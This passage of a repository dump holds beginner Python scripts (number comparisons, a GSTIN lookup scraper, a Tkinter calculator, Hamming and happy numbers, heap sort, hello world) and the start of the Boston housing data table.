          "content": "# Python program to find the largest number among the three input numbers\n\n# change the values of num1, num2 and num3\n# for a different result\nnum1 = 10\nnum2 = 14\nnum3 = 12\n\n# uncomment following lines to take three numbers from user\n#num1 = float(input(\"Enter first number: \"))\n#num2 = float(input(\"Enter second number: \"))\n#num3 = float(input(\"Enter third number: \"))\n\nif (num1 >= num2) and (num1 >= num3):\n   largest = num1\nelif (num2 >= num1) and (num2 >= num3):\n   largest = num2\nelse:\n   largest = num3\n\nprint(\"The largest number is\", largest)\n"
        },
        {
          "name": "greattwono",
          "type": "blob",
          "size": 0.2333984375,
          "content": "# Python Program to find the largest of two numbers using an arithmetic operator\na = int(input(\"Enter the first number: \"))\nb = int(input(\"Enter the second number: \"))\nif(a - b > 0):\n  print(a, \"is greater\")\nelse:\n  print(b, \"is greater\")\n"
        },
        {
          "name": "gstin_scraper.py",
          "type": "blob",
          "size": 2.6611328125,
          "content": "from bs4 import BeautifulSoup\nimport requests\nimport time\n\n# Script Name\t\t: gstin_scraper.py\n# Author\t\t\t\t: Purshotam\n# Created\t\t\t\t: Sep 6, 2021 7:59 PM\n# Last Modified\t\t: Oct 3, 2023 6:28 PM\n# Version\t\t\t\t: 1.0\n# Modifications\t\t:\n\"\"\" Description\t:\nGSTIN, short for Goods and Services Tax Identification Number, \nis a unique 15 digit identification number assigned to every taxpayer \n(primarily dealer or supplier or any business entity) registered under the GST regime.\nThis script is able to fetch GSTIN numbers for any company registered in the\nMumbai / Banglore region.\n\"\"\"\n\n\n# Using a demo list in case of testing the script. \n# This list will be used in case user skips \"company input\" dialogue by pressing enter.\ndemo_companies = [\"Bank of Baroda\", \"Trident Limited\", \"Reliance Limited\", \"The Yummy Treat\", \"Yes Bank\", \"Mumbai Mineral Trading Corporation\"]\n\ndef get_company_list():\n    company_list = []\n    \n    while True:\n        company = input(\"Enter a company name (or press Enter to finish): \")\n        if not company:\n            break\n        company_list.append(company)\n    \n    return company_list\n\ndef fetch_gstins(company_name, csrf_token):\n    third_party_gstin_site = \"https://www.knowyourgst.com/gst-number-search/by-name-pan/\"\n    payload = {'gstnum': company_name, 'csrfmiddlewaretoken': csrf_token}\n\n    # Getting the HTML content and extracting the GSTIN content using BeautifulSoup.\n    html_content = requests.post(third_party_gstin_site, data=payload)\n    soup = BeautifulSoup(html_content.text, 'html.parser')\n    site_results = soup.find_all(id=\"searchresult\")\n\n    # Extracting GSTIN specific values from child elements.\n    gstins = [result.strong.next_sibling.next_sibling.string for result in site_results]\n\n    return gstins\n\ndef main():\n    temp = get_company_list()\n    companies = temp if temp else demo_companies\n\n    all_gstin_data = \"\"\n    third_party_gstin_site = \"https://www.knowyourgst.com/gst-number-search/by-name-pan/\"\n\n    # Getting the CSRF value for further RESTful calls.\n    page_with_csrf = requests.get(third_party_gstin_site)\n    soup = BeautifulSoup(page_with_csrf.text, 'html.parser')\n    csrf_token = soup.find('input', {\"name\": \"csrfmiddlewaretoken\"})['value']\n\n    for company in companies:\n        gstins = fetch_gstins(company, csrf_token)\n\n        # Only include GSTINs for Bengaluru and Mumbai-based companies\n        comma_separated_gstins = ', '.join([g for g in gstins if g.startswith(('27', '29'))])\n\n        all_gstin_data += f\"{company} = {comma_separated_gstins}\\n\\n\"\n\n        # Delaying for false DDOS alerts on the third-party site\n        time.sleep(0.5)\n\n    # Printing the data\n    print(all_gstin_data)\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "gui_calculator.py",
          "type": "blob",
          "size": 4.466796875,
          "content": "# Calculator\r\nfrom tkinter import *\r\n\r\nw = Tk()\r\nw.geometry(\"500x500\")\r\nw.title(\"Calculatorax\")\r\nw.configure(bg=\"#03befc\")\r\n\r\n# Functions(Keypad)\r\ndef calc1():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn1[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc2():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn2[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc3():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn3[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc4():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn4[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc5():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn5[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc6():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn6[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc7():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn7[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc8():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn8[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc9():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn9[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\ndef calc0():\r\n    b = txt1.get()\r\n    txt1.delete(0, END)\r\n    b1 = b + btn0[\"text\"]\r\n    txt1.insert(0, b1)\r\n\r\n\r\n# Functions(operators)\r\n\r\nx = 0\r\n\r\n\r\ndef add():\r\n    global x\r\n    add.b = eval(txt1.get())\r\n    txt1.delete(0, END)\r\n    x = x + 1\r\n\r\n\r\ndef subtract():\r\n    global x\r\n    subtract.b = eval(txt1.get())\r\n    txt1.delete(0, END)\r\n    x = x + 2\r\n\r\n\r\ndef get():\r\n    b = txt1.get()\r\n\r\n\r\ndef equals():\r\n    global x\r\n    if x == 1:\r\n        c = (eval(txt1.get())) + add.b\r\n        cls()\r\n        txt1.insert(0, c)\r\n\r\n    elif x == 2:\r\n        c = subtract.b - (eval(txt1.get()))\r\n        cls()\r\n        txt1.insert(0, c)\r\n\r\n    elif x == 3:\r\n        c = multiply.b * (eval(txt1.get()))\r\n        cls()\r\n        txt1.insert(0, c)\r\n    elif x == 4:\r\n        c = divide.b / (eval(txt1.get()))\r\n        cls()\r\n        txt1.insert(0, c)\r\n\r\n\r\ndef cls():\r\n    global x\r\n    x = 0\r\n    txt1.delete(0, END)\r\n\r\n\r\ndef multiply():\r\n    global x\r\n    multiply.b = eval(txt1.get())\r\n    txt1.delete(0, END)\r\n    x = x + 3\r\n\r\n\r\ndef divide():\r\n    global x\r\n    divide.b = eval(txt1.get())\r\n    txt1.delete(0, END)\r\n    x = x + 4\r\n\r\n\r\n# Labels\r\n\r\nlbl1 = Label(\r\n    w, text=\"Calculatorax\", font=(\"Times New Roman\", 35), fg=\"#232226\", bg=\"#fc9d03\"\r\n)\r\n\r\n# Entryboxes\r\ntxt1 = Entry(w, width=80, font=30)\r\n\r\n# Buttons\r\n\r\nbtn1 = Button(w, text=\"1\", font=(\"Unispace\", 25), command=calc1, bg=\"#c3c6d9\")\r\nbtn2 = Button(w, text=\"2\", font=(\"Unispace\", 25), command=calc2, bg=\"#c3c6d9\")\r\nbtn3 = Button(w, text=\"3\", font=(\"Unispace\", 25), command=calc3, bg=\"#c3c6d9\")\r\nbtn4 = Button(w, text=\"4\", font=(\"Unispace\", 25), command=calc4, bg=\"#c3c6d9\")\r\nbtn5 = Button(w, text=\"5\", font=(\"Unispace\", 25), command=calc5, bg=\"#c3c6d9\")\r\nbtn6 = Button(w, text=\"6\", font=(\"Unispace\", 25), command=calc6, bg=\"#c3c6d9\")\r\nbtn7 = Button(w, text=\"7\", font=(\"Unispace\", 25), command=calc7, bg=\"#c3c6d9\")\r\nbtn8 = Button(w, text=\"8\", font=(\"Unispace\", 25), command=calc8, bg=\"#c3c6d9\")\r\nbtn9 = Button(w, text=\"9\", font=(\"Unispace\", 25), command=calc9, bg=\"#c3c6d9\")\r\nbtn0 = Button(w, text=\"0\", font=(\"Unispace\", 25), command=calc0, bg=\"#c3c6d9\")\r\n\r\nbtn_addition = Button(w, text=\"+\", font=(\"Unispace\", 26), command=add, bg=\"#3954ed\")\r\nbtn_equals = Button(\r\n    w,\r\n    text=\"Calculate\",\r\n    font=(\r\n        \"Unispace\",\r\n        24,\r\n    ),\r\n    command=equals,\r\n    bg=\"#e876e6\",\r\n)\r\nbtn_clear = Button(\r\n    w,\r\n    text=\"Clear\",\r\n    font=(\r\n        \"Unispace\",\r\n        24,\r\n    ),\r\n    command=cls,\r\n    bg=\"#e876e6\",\r\n)\r\nbtn_subtract = Button(\r\n    w, text=\"-\", font=(\"Unispace\", 26), command=subtract, bg=\"#3954ed\"\r\n)\r\nbtn_multiplication = Button(\r\n    w, text=\"x\", font=(\"Unispace\", 26), command=multiply, bg=\"#3954ed\"\r\n)\r\nbtn_division = Button(w, text=\"÷\", font=(\"Unispace\", 26), command=divide, bg=\"#3954ed\")\r\n\r\n# Placements(Labels)\r\n\r\nlbl1.place(x=120, y=0)\r\n\r\n# Placements(entrybox)\r\n\r\ntxt1.place(x=7, y=50, height=35)\r\n\r\n# Placements(Buttons)\r\nbtn1.place(x=50, y=100)\r\nbtn2.place(x=120, y=100)\r\nbtn3.place(x=190, y=100)\r\nbtn4.place(x=50, y=200)\r\nbtn5.place(x=120, y=200)\r\nbtn6.place(x=190, y=200)\r\nbtn7.place(x=50, y=300)\r\nbtn8.place(x=120, y=300)\r\nbtn9.place(x=190, y=300)\r\nbtn0.place(x=120, y=400)\r\n\r\nbtn_addition.place(x=290, y=100)\r\nbtn_equals.place(x=260, y=420)\r\nbtn_clear.place(x=290, y=350)\r\nbtn_subtract.place(x=360, y=100)\r\nbtn_multiplication.place(x=290, y=200)\r\nbtn_division.place(x=360, y=200)\r\n\r\nw.mainloop()\r\n"
        },
        {
          "name": "hamming-numbers",
          "type": "blob",
          "size": 1.740234375,
          "content": "\"\"\"\nA Hamming number is a positive integer of the form 2^i*3^j*5^k, for some\nnon-negative integers i, j, and k. They are often referred to as regular numbers.\nThe first 20 Hamming numbers are: 1, 2, 3, 4, 5, 6, 8, 9, 10, 12, 15, 16, 18, 20, 24, 25, 27, 30, 32, and 36\n\"\"\"\n\n\ndef hamming(n_element: int) -> list:\n    \"\"\"\n    This function creates an ordered list of n length as requested, and afterwards\n    returns the last value of the list. It must be given a positive integer.\n\n    :param n_element: The number of elements on the list\n    :return: The nth element of the list\n\n    >>> hamming(5)\n    [1, 2, 3, 4, 5]\n    >>> hamming(10)\n    [1, 2, 3, 4, 5, 6, 8, 9, 10, 12]\n    >>> hamming(15)\n    [1, 2, 3, 4, 5, 6, 8, 9, 10, 12, 15, 16, 18, 20, 24]\n    \"\"\"\n    n_element = int(n_element)\n    if n_element < 1:\n        my_error = ValueError(\"a should be a positive number\")\n        raise my_error\n\n    hamming_list = [1]\n    i, j, k = (0, 0, 0)\n    index = 1\n    while index < n_element:\n        while hamming_list[i] * 2 <= hamming_list[-1]:\n            i += 1\n        while hamming_list[j] * 3 <= hamming_list[-1]:\n            j += 1\n        while hamming_list[k] * 5 <= hamming_list[-1]:\n            k += 1\n        hamming_list.append(\n            min(hamming_list[i] * 2, hamming_list[j] * 3, hamming_list[k] * 5)\n        )\n        index += 1\n    return hamming_list\n\n\nif __name__ == \"__main__\":\n    n = input(\"Enter the last number (nth term) of the Hamming Number Series: \")\n    print(\"Formula of Hamming Number Series => 2^i * 3^j * 5^k\")\n    hamming_numbers = hamming(int(n))\n    print(\"-----------------------------------------------------\")\n    print(f\"The list with nth numbers is: {hamming_numbers}\")\n    print(\"-----------------------------------------------------\")\n"
        },
        {
          "name": "happy_num.py",
          "type": "blob",
          "size": 1.1708984375,
          "content": "#Way2 1:\n\n#isHappyNumber() will determine whether a number is happy or not    \ndef isHappyNumber(num):    \n    rem = sum = 0;    \n        \n    #Calculates the sum of squares of digits    \n    while(num > 0):    \n        rem = num%10;    \n        sum = sum + (rem*rem);    \n        num = num//10;    \n    return sum;    \n        \nnum = 82;    \nresult = num;    \n     \nwhile(result != 1 and result != 4):    \n    result = isHappyNumber(result);    \n     \n#Happy number always ends with 1    \nif(result == 1):    \n    print(str(num) + \" is a happy number after apply way 1\");    \n#Unhappy number ends in a cycle of repeating numbers which contain 4    \nelif(result == 4):    \n    print(str(num) + \" is not a happy number after apply way 1\");  \n\n\n\n\n\n#way 2:\n\n#Another way to do this and code is also less\nn=num\nsetData=set()\t\t#set datastructure for checking a number is repeated or not.\nwhile 1:\n\tif n==1:\n\t\tprint(\"{} is a happy number after apply way 2\".format(num))\n\t\tbreak\n\tif n in setData:\n\t\tprint(\"{} is Not a happy number after apply way 2\".format(num))\n\t\tbreak\n\telse:\n\t\tsetData.add(n)\t#adding into set if not inside set\n\t\tn=int(''.join(str(sum([int(i)**2 for i in str(n)]))))       #Pythonic way\n"
        },
        {
          "name": "heap_sort.py",
          "type": "blob",
          "size": 1.396484375,
          "content": "# This program is a comparison based sorting technique.\n# It is similar to selection sort in the sense that it first identifies the maximum element,\n# and places it at the end. We repeat the process until the list is sorted.\n# The sort algorithm has a time complexity of O(nlogn)\n\n\ndef refineHeap(arr, n, i):\n    # Initialize the largest entry as the root of the heap\n    largest = i\n    left = 2 * i + 1\n    right = 2 * i + 2\n\n    # If the left child exists and it is larger than largest, replace it\n    if left < n and arr[largest] < arr[left]:\n        largest = left\n\n    # Perform the same operation for the right hand side of the heap\n    if right < n and arr[largest] < arr[right]:\n        largest = right\n\n    # Change root if the largest value changed\n    if largest != i:\n        arr[i], arr[largest] = arr[largest], arr[i]\n\n        # Repeat the process until the heap is fully defined\n        refineHeap(arr, n, largest)\n\n\n# Main function\ndef heapSort(arr):\n    n = len(arr)\n\n    # Make a heap\n    for i in range(n // 2 - 1, -1, -1):\n        refineHeap(arr, n, i)\n\n    # Extract elements individually\n    for i in range(n - 1, 0, -1):\n        # Fancy notation for swapping two values in an array\n        arr[i], arr[0] = arr[0], arr[i]\n        refineHeap(arr, i, 0)\n\n\n# Code that will run on start\narr = [15, 29, 9, 3, 16, 7, 66, 4]\nprint(\"Unsorted Array: \", arr)\nheapSort(arr)\nn = len(arr)\nprint(\"Sorted array: \", arr)\n"
        },
        {
          "name": "helloworld.py",
          "type": "blob",
          "size": 0.7666015625,
          "content": "# master\n# This program prints Hello, world!\n\nimport time\n\nprint(\"Hello I'm Geek! Let's Execute Your Code!\")\ntime.sleep(1)\nprint(\"Starting Our Code!\")\ntime.sleep(1)\n\nprint(\"Always Remember Python Is Case Sensitive!\")\ntime.sleep(1)\nprint(\"Here We Go!\")\ntime.sleep(1)\n# master\nprint(\"Hello World!\")\ntime.sleep(1)\nprint(\"A Quick Tip!\")\ntime.sleep(1)\nprint(\n    \"make sure to use the same type of quotes(quotation marks or apostrophes)at the end that you used at the start\"\n)\n\n# in c -> printf(\"Hello World!\");\n# in java -> System.out.println(\"Hello World!\");\n# in c++ -> cout << \"Hello World\";\n# master\n# in javascript - > console.log(\"Hello World\");\n\n# in javascript - > console.log(\"Hello World\") or document.write(\"Hello World!\")\ntime.sleep(2)\nprint(\"All The Best!\")\n# Adios!\n# master\n"
        },
        {
          "name": "housing.data",
          "type": "blob",
          "size": 47.931640625,
          "content": " 0.00632  18.00   2.310  0  0.5380  6.5750  65.20  4.0900   1  296.0  15.30 396.90   4.98  24.00\n 0.02731   0.00   7.070  0  0.4690  6.4210  78.90  4.9671   2  242.0  17.80 396.90   9.14  21.60\n 0.02729   0.00   7.070  0  0.4690  7.1850  61.10  4.9671   2  242.0  17.80 392.83   4.03  34.70\n 0.03237   0.00   2.180  0  0.4580  6.9980  45.80  6.0622   3  222.0  18.70 394.63   2.94  33.40\n 0.06905   0.00   2.180  0  0.4580  7.1470  54.20  6.0622   3  222.0  18.70 396.90   5.33  36.20\n 0.02985   0.00   2.180  0  0.4580  6.4300  58.70  6.0622   3  222.0  18.70 394.12   5.21  28.70\n 0.08829  12.50   7.870  0  0.5240  6.0120  66.60  5.5605   5  311.0  15.20 395.60  12.43  22.90\n 0.14455  12.50   7.870  0  0.5240  6.1720  96.10  5.9505   5  311.0  15.20 396.90  19.15  27.10\n 0.21124  12.50   7.870  0  0.5240  5.6310 100.00  6.0821   5  311.0  15.20 386.63  29.93  16.50\n 0.17004  12.50   7.870  0  0.5240  6.0040  85.90  6.5921   5  311.0  15.20 386.71  17.10  18.90\n 0.22489  12.50   7.870  0  0.5240  6.3770  94.30  6.3467   5  311.0  15.20 392.52  20.45  15.00\n 0.11747  12.50   7.870  0  0.5240  6.0090  82.90  6.2267   5  311.0  15.20 396.90  13.27  18.90\n 0.09378  12.50   7.870  0  0.5240  5.8890  39.00  5.4509   5  311.0  15.20 390.50  15.71  21.70\n 0.62976   0.00   8.140  0  0.5380  5.9490  61.80  4.7075   4  307.0  21.00 396.90   8.26  20.40\n 0.63796   0.00   8.140  0  0.5380  6.0960  84.50  4.4619   4  307.0  21.00 380.02  10.26  18.20\n 0.62739   0.00   8.140  0  0.5380  5.8340  56.50  4.4986   4  307.0  21.00 395.62   8.47  19.90\n 1.05393   0.00   8.140  0  0.5380  5.9350  29.30  4.4986   4  307.0  21.00 386.85   6.58  23.10\n 0.78420   0.00   8.140  0  0.5380  5.9900  81.70  4.2579   4  307.0  21.00 386.75  14.67  17.50\n 0.80271   0.00   8.140  0  0.5380  5.4560  36.60  3.7965   4  307.0  21.00 288.99  11.69  20.20\n 0.72580   0.00   8.140  0  0.5380  5.7270  69.50  3.7965   4  307.0  21.00 390.95  11.28  18.20\n 1.25179   0.00   8.140  0  0.5380  5.5700  98.10  3.7979   4  307.0  21.00 376.57  21.02  13.60\n 0.85204   0.00   8.140  0  0.5380  5.9650  89.20  4.0123   4  307.0  21.00 392.53  13.83  19.60\n 1.23247   0.00   8.140  0  0.5380  6.1420  91.70  3.9769   4  307.0  21.00 396.90  18.72  15.20\n 0.98843   0.00   8.140  0  0.5380  5.8130 100.00  4.0952   4  307.0  21.00 394.54  19.88  14.50\n 0.75026   0.00   8.140  0  0.5380  5.9240  94.10  4.3996   4  307.0  21.00 394.33  16.30  15.60\n 0.84054   0.00   8.140  0  0.5380  5.5990  85.70  4.4546   4  307.0  21.00 303.42  16.51  13.90\n 0.67191   0.00   8.140  0  0.5380  5.8130  90.30  4.6820   4  307.0  21.00 376.88  14.81  16.60\n 0.95577   0.00   8.140  0  0.5380  6.0470  88.80  4.4534   4  307.0  21.00 306.38  17.28  14.80\n 0.77299   0.00   8.140  0  0.5380  6.4950  94.40  4.4547   4  307.0  21.00 387.94  12.80  18.40\n 1.00245   0.00   8.140  0  0.5380  6.6740  87.30  4.2390   4  307.0  21.00 380.23  11.98  21.00\n 1.13081   0.00   8.140  0  0.5380  5.7130  94.10  4.2330   4  307.0  21.00 360.17  22.60  12.70\n 1.35472   0.00   8.140  0  0.5380  6.0720 100.00  4.1750   4  307.0  21.00 376.73  13.04  14.50\n 1.38799   0.00   8.140  0  0.5380  5.9500  82.00  3.9900   4  307.0  21.00 232.60  27.71  13.20\n 1.15172   0.00   8.140  0  0.5380  5.7010  95.00  3.7872   4  307.0  21.00 358.77  18.35  13.10\n 1.61282   0.00   8.140  0  0.5380  6.0960  96.90  3.7598   4  307.0  21.00 248.31  20.34  13.50\n 0.06417   0.00   5.960  0  0.4990  5.9330  68.20  3.3603   5  279.0  19.20 396.90   9.68  18.90\n 0.09744   0.00   5.960  0  0.4990  5.8410  61.40  3.3779   5  279.0  19.20 377.56  11.41  20.00\n 0.08014   0.00   5.960  0  0.4990  5.8500  41.50  3.9342   5  279.0  19.20 396.90   8.77  21.00\n 0.17505   0.00   5.960  0  0.4990  5.9660  30.20  3.8473   5  279.0  19.20 393.43  10.13  24.70\n 0.02763  75.00   2.950  0  0.4280  6.5950  21.80  5.4011   3  252.0  18.30 395.63   4.32  30.80\n 0.03359  75.00   2.950  0  0.4280  7.0240  15.80  5.4011   3  252.0  18.30 395.62   1.98  34.90\n 0.12744   0.00   6.910  0  0.4480  6.7700   2.90  5.7209   3  233.0  17.90 385.41   4.84  26.60\n 0.14150   0.00   6.910  0  0.4480  6.1690   6.60  5.7209   3  233.0  17.90 383.37   5.81  25.30\n 0.15936   0.00   6.910  0  0.4480  6.2110   6.50  5.7209   3  233.0  17.90 394.46   7.44  24.70\n 0.12269   0.00   6.910  0  0.4480  6.0690  40.00  5.7209   3  233.0  17.90 389.39   9.55  21.20\n 0.17142   0.00   6.910  0  0.4480  5.6820  33.80  5.1004   3  233.0  17.90 396.90  10.21  19.30\n 0.18836   0.00   6.910  0  0.4480  5.7860  33.30  5.1004   3  233.0  17.90 396.90  14.15  20.00\n 0.22927   0.00   6.910  0  0.4480  6.0300  85.50  5.6894   3  233.0  17.90 392.74  18.80  16.60\n 0.25387   0.00   6.910  0  0.4480  5.3990  95.30  5.8700   3  233.0  17.90 396.90  30.81  14.40\n 0.21977   0.00   6.910  0  0.4480  5.6020  62.00  6.0877   3  233.0  17.90 396.90  16.20  19.40\n 0.08873  21.00   5.640  0  0.4390  5.9630  45.70  6.8147   4  243.0  16.80 395.56  13.45  19.70\n 0.04337  21.00   5.640  0  0.4390  6.1150  63.00  6.8147   4  243.0  16.80 393.97   9.43  20.50\n 0.05360  21.00   5.640  0  0.4390  6.5110  21.10  6.8147   4  243.0  16.80 396.90   5.28  25.00\n 0.04981  21.00   5.640  0  0.4390  5.9980  21.40  6.8147   4  243.0  16.80 396.90   8.43  23.40\n 0.01360  75.00   4.000  0  0.4100  5.8880  47.60  7.3197   3  469.0  21.10 396.90  14.80  18.90\n 0.01311  90.00   1.220  0  0.4030  7.2490  21.90  8.6966   5  226.0  17.90 395.93   4.81  35.40\n 0.02055  85.00   0.740  0  0.4100  6.3830  35.70  9.1876   2  313.0  17.30 396.90   5.77  24.70\n 0.01432 100.00   1.320  0  0.4110  6.8160  40.50  8.3248   5  256.0  15.10 392.90   3.95  31.60\n 0.15445  25.00   5.130  0  0.4530  6.1450  29.20  7.8148   8  284.0  19.70 390.68   6.86  23.30\n 0.10328  25.00   5.130  0  0.4530  5.9270  47.20  6.9320   8  284.0  19.70 396.90   9.22  19.60\n 0.14932  25.00   5.130  0  0.4530  5.7410  66.20  7.2254   8  284.0  19.70 395.11  13.15  18.70\n 0.17171  25.00   5.130  0  0.4530  5.9660  93.40  6.8185   8  284.0  19.70 378.08  14.44  16.00\n 0.11027  25.00   5.130  0  0.4530  6.4560  67.80  7.2255   8  284.0  19.70 396.90   6.73  22.20\n 0.12650  25.00   5.130  0  0.4530  6.7620  43.40  7.9809   8  284.0  19.70 395.58   9.50  25.00\n 0.01951  17.50   1.380  0  0.4161  7.1040  59.50  9.2229   3  216.0  18.60 393.24   8.05  33.00\n 0.03584  80.00   3.370  0  0.3980  6.2900  17.80  6.6115   4  337.0  16.10 396.90   4.67  23.50\n 0.04379  80.00   3.370  0  0.3980  5.7870  31.10  6.6115   4  337.0  16.10 396.90  10.24  19.40\n 0.05789  12.50   6.070  0  0.4090  5.8780  21.40  6.4980   4  345.0  18.90 396.21   8.10  22.00\n 0.13554  12.50   6.070  0  0.4090  5.5940  36.80  6.4980   4  345.0  18.90 396.90  13.09  17.40\n 0.12816  12.50   6.070  0  0.4090  5.8850  33.00  6.4980   4  345.0  18.90 396.90   8.79  20.90\n 0.08826   0.00  10.810  0  0.4130  6.4170   6.60  5.2873   4  305.0  19.20 383.73   6.72  24.20\n 0.15876   0.00  10.810  0  0.4130  5.9610  17.50  5.2873   4  305.0  19.20 376.94   9.88  21.70\n 0.09164   0.00  10.810  0  0.4130  6.0650   7.80  5.2873   4  305.0  19.20 390.91   5.52  22.80\n 0.19539   0.00  10.810  0  0.4130  6.2450   6.20  5.2873   4  305.0  19.20 377.17   7.54  23.40\n 0.07896   0.00  12.830  0  0.4370  6.2730   6.00  4.2515   5  398.0  18.70 394.92   6.78  24.10\n 0.09512   0.00  12.830  0  0.4370  6.2860  45.00  4.5026   5  398.0  18.70 383.23   8.94  21.40\n 0.10153   0.00  12.830  0  0.4370  6.2790  74.50  4.0522   5  398.0  18.70 373.66  11.97  20.00\n 0.08707   0.00  12.830  0  0.4370  6.1400  45.80  4.0905   5  398.0  18.70 386.96  10.27  20.80\n 0.05646   0.00  12.830  0  0.4370  6.2320  53.70  5.0141   5  398.0  18.70 386.40  12.34  21.20\n 0.08387   0.00  12.830  0  0.4370  5.8740  36.60  4.5026   5  398.0  18.70 396.06   9.10  20.30\n 0.04113  25.00   4.860  0  0.4260  6.7270  33.50  5.4007   4  281.0  19.00 396.90   5.29  28.00\n 0.04462  25.00   4.860  0  0.4260  6.6190  70.40  5.4007   4  281.0  19.00 395.63   7.22  23.90\n 0.03659  25.00   4.860  0  0.4260  6.3020  32.20  5.4007   4  281.0  19.00 396.90   6.72  24.80\n 0.03551  25.00   4.860  0  0.4260  6.1670  46.70  5.4007   4  281.0  19.00 390.64   7.51  22.90\n 0.05059   0.00   4.490  0  0.4490  6.3890  48.00  4.7794   3  247.0  18.50 396.90   9.62  23.90\n 0.05735   0.00   4.490  0  0.4490  6.6300  56.10  4.4377   3  247.0  18.50 392.30   6.53  26.60\n 0.05188   0.00   4.490  0  0.4490  6.0150  45.10  4.4272   3  247.0  18.50 395.99  12.86  22.50\n 0.07151   0.00   4.490  0  0.4490  6.1210  56.80  3.7476   3  247.0  18.50 395.15   8.44  22.20\n 0.05660   0.00   3.410  0  0.4890  7.0070  86.30  3.4217   2  270.0  17.80 396.90   5.50  23.60\n 0.05302   0.00   3.410  0  0.4890  7.0790  63.10  3.4145   2  270.0  17.80 396.06   5.70  28.70\n 0.04684   0.00   3.410  0  0.4890  6.4170  66.10  3.0923   2  270.0  17.80 392.18   8.81  22.60\n 0.03932   0.00   3.410  0  0.4890  6.4050  73.90  3.0921   2  270.0  17.80 393.55   8.20  22.00\n 0.04203  28.00  15.040  0  0.4640  6.4420  53.60  3.6659   4  270.0  18.20 395.01   8.16  22.90\n 0.02875  28.00  15.040  0  0.4640  6.2110  28.90  3.6659   4  270.0  18.20 396.33   6.21  25.00\n 0.04294  28.00  15.040  0  0.4640  6.2490  77.30  3.6150   4  270.0  18.20 396.90  10.59  20.60\n 0.12204   0.00   2.890  0  0.4450  6.6250  57.80  3.4952   2  276.0  18.00 357.98   6.65  28.40\n 0.11504   0.00   2.890  0  0.4450  6.1630  69.60  3.4952   2  276.0  18.00 391.83  11.34  21.40\n 0.12083   0.00   2.890  0  0.4450  8.0690  76.00  3.4952   2  276.0  18.00 396.90   4.21  38.70\n 0.08187   0.00   2.890  0  0.4450  7.8200  36.90  3.4952   2  276.0  18.00 393.53   3.57  43.80\n 0.06860   0.00   2.890  0  0.4450  7.4160  62.50  3.4952   2  276.0  18.00 396.90   6.19  33.20\n 0.14866   0.00   8.560  0  0.5200  6.7270  79.90  2.7778   5  384.0  20.90 394.76   9.42  27.50\n 0.11432   0.00   8.560  0  0.5200  6.7810  71.30  2.8561   5  384.0  20.90 395.58   7.67  26.50\n 0.22876   0.00   8.560  0  0.5200  6.4050  85.40  2.7147   5  384.0  20.90  70.80  10.63  18.60\n 0.21161   0.00   8.560  0  0.5200  6.1370  87.40  2.7147   5  384.0  20.90 394.47  13.44  19.30\n 0.13960   0.00   8.560  0  0.5200  6.1670  90.00  2.4210   5  384.0  20.90 392.69  12.33  20.10\n 0.13262   0.00   8.560  0  0.5200  5.8510  96.70  2.1069   5  384.0  20.90 394.05  16.47  19.50\n 0.17120   0.00   8.560  0  0.5200  5.8360  91.90  2.2110   5  384.0  20.90 395.67  18.66  19.50\n 0.13117   0.00   8.560  0  0.5200  6.1270  85.20  2.1224   5  384.0  20.90 387.69  14.09  20.40\n 0.12802   0.00   8.560  0  0.5200  6.4740  97.10  2.4329   5  384.0  20.90 395.24  12.27  19.80\n 0.26363   0.00   8.560  0  0.5200  6.2290  91.20  2.5451   5  384.0  20.90 391.23  15.55  19.40\n 0.10793   0.00   8.560  0  0.5200  6.1950  54.40  2.7778   5  384.0  20.90 393.49  13.00  21.70\n 0.10084   0.00  10.010  0  0.5470  6.7150  81.60  2.6775   6  432.0  17.80 395.59  10.16  22.80\n 0.12329   0.00  10.010  0  0.5470  5.9130  92.90  2.3534   6  432.0  17.80 394.95  16.21  18.80\n 0.22212   0.00  10.010  0  0.5470  6.0920  95.40  2.5480   6  432.0  17.80 396.90  17.09  18.70\n 0.14231   0.00  10.010  0  0.5470  6.2540  84.20  2.2565   6  432.0  17.80 388.74  10.45  18.50\n 0.17134   0.00  10.010  0  0.5470  5.9280  88.20  2.4631   6  432.0  17.80 344.91  15.76  18.30\n 0.13158   0.00  10.010  0  0.5470  6.1760  72.50  2.7301   6  432.0  17.80 393.30  12.04  21.20\n 0.15098   0.00  10.010  0  0.5470  6.0210  82.60  2.7474   6  432.0  17.80 394.51  10.30  19.20\n 0.13058   0.00  10.010  0  0.5470  5.8720  73.10  2.4775   6  432.0  17.80 338.63  15.37  20.40\n 0.14476   0.00  10.010  0  0.5470  5.7310  65.20  2.7592   6  432.0  17.80 391.50  13.61  19.30\n 0.06899   0.00  25.650  0  0.5810  5.8700  69.70  2.2577   2  188.0  19.10 389.15  14.37  22.00\n 0.07165   0.00  25.650  0  0.5810  6.0040  84.10  2.1974   2  188.0  19.10 377.67  14.27  20.30\n 0.09299   0.00  25.650  0  0.5810  5.9610  92.90  2.0869   2  188.0  19.10 378.09  17.93  20.50\n 0.15038   0.00  25.650  0  0.5810  5.8560  97.00  1.9444   2  188.0  19.10 370.31  25.41  17.30\n 0.09849   0.00  25.650  0  0.5810  5.8790  95.80  2.0063   2  188.0  19.10 379.38  17.58  18.80\n 0.16902   0.00  25.650  0  0.5810  5.9860  88.40  1.9929   2  188.0 